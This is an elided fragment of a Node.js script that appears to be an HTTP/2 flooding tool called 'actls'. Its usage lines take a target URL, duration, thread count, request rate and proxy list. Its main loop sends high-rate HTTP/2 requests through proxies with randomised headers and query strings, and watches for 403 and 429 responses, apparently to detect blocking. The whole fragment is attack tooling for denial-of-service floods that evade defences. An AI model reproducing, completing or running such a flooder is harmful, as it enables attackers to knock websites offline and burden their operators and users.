...
if (process.argv.length < 7) {
    ...
    // --------------------------
    log('Examples -')
    log(' ./actls https://localhost.com 120 20 64 proxy.txt')
    log(' ./actls https://localhost.com 120 20 64 proxy.txt -d 30 -s -e')
    log(' ./actls https://localhost.com 120 20 64 proxy.txt --query %RAND% --log 200')
    log(' ./actls https://localhost.com 120 20 64 proxy.txt -h user-agent@test_ua -h accept@*/*')
    log(' ./actls https://localhost.com 120 20 64 proxy.txt -h user-agent@"Mozilla %RAND-16%"')
    process.exit();
}
...
function http2run() {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0,check403 = 0; i < args.rate; i++) {
                    let dynHeaders = {}
                    ...
                    const request = client.request(dynHeaders)
					   ...
					   if(statusCode=="429" || statusCode=="403") check403 = 1;
                            if (_log) {
